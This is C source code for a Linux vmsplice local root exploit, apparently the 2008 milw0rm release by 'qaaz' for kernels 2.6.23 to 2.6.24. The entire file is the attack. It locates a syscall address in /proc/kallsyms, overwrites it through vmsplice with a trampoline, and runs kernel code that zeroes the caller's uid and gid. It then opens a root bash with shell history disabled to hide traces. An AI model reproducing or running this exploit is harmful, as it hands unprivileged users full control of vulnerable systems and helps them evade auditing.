/*
 * diane_lane_fucked_hard.c
 *
 * Linux vmsplice Local Root Exploit
 * By qaaz
 *
 * Linux 2.6.23 - 2.6.24
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>

#define TARGET_PATTERN		" sys_vm86old"
#define TARGET_SYSCALL		113

#ifndef __NR_vmsplice
#define __NR_vmsplice		316
#endif

#define _vmsplice(fd,io,nr,fl)	syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
#define gimmeroot()		syscall(TARGET_SYSCALL, 31337, kernel_code, 1, 2, 3, 4)

#define TRAMP_CODE		(void *) trampoline
#define TRAMP_SIZE		( sizeof(trampoline) - 1 )

unsigned char trampoline[] =
"\x8b\x5c\x24\x04"		/* mov    0x4(%esp),%ebx	*/
"\x8b\x4c\x24\x08"		/* mov    0x8(%esp),%ecx	*/
"\x81\xfb\x69\x7a\x00\x00"	/* cmp    $31337,%ebx		*/
"\x75\x02"			/* jne    +2			*/
"\xff\xd1"			/* call   *%ecx			*/
"\xb8\xea\xff\xff\xff"		/* mov    $-EINVAL,%eax		*/
"\xc3"				/* ret				*/
;

void	die(char *msg, int err)
{
	printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
	fflush(stdout);
	fflush(stderr);
	exit(1);
}

long	get_target()
{
	FILE	*f;
	long	addr = 0;
	char	line[128];

	f = fopen("/proc/kallsyms", "r");
	if (!f) die("/proc/kallsyms", errno);

	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, TARGET_PATTERN)) {
			addr = strtoul(line, NULL, 16);
			break;
		}
	}

	fclose(f);
	return addr;
}

static inline __attribute__((always_inline))
void *	get_current()
{
	unsigned long curr;
	__asm__ __volatile__ (
	"movl %%esp, %%eax ;"
	"andl %1, %%eax ;"
	"movl (%%eax), %0"
	: "=r" (curr)
	: "i" (~8191)
	);
	return (void *) curr;
}

static uint uid, gid;

void	kernel_code()
{
	int	i;
	uint	*p = get_current();

	for (i = 0; i < 1024-13; i++) {
		if (p[0] == uid && p[1] == uid &&
		    p[2] == uid && p[3] == uid &&
		    p[4] == gid && p[5] == gid &&
		    p[6] == gid && p[7] == gid) {
			p[0] = p[1] = p[2] = p[3] = 0;
			p[4] = p[5] = p[6] = p[7] = 0;
			p = (uint *) ((char *)(p + 8) + sizeof(void *));
			p[0] = p[1] = p[2] = ~0;
			break;
		}
		p++;
	}
}

int	main(int argc, char *argv[])
{
	int		pi[2];
	long		addr;
	struct iovec	iov;

	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);

	printf("-----------------------------------\n");
	printf(" Linux vmsplice Local Root Exploit\n");
	printf(" By qaaz\n");
	printf("-----------------------------------\n");

	if (!uid || !gid)
		die("!@#$", 0);

	addr = get_target();
	printf("[+] addr: 0x%lx\n", addr);

	if (pipe(pi) < 0)
		die("pipe", errno);

	iov.iov_base = (void *) addr;
	iov.iov_len  = TRAMP_SIZE;

	write(pi[1], TRAMP_CODE, TRAMP_SIZE);
	_vmsplice(pi[0], &iov, 1, 0);

	gimmeroot();

	if (getuid() != 0)
		die("wtf", 0);

	printf("[+] root\n");
	putenv("HISTFILE=/dev/null");
	execl("/bin/bash", "bash", "-i", NULL);
	die("/bin/bash", errno);
	return 0;
}

// milw0rm.com [2008-02-09]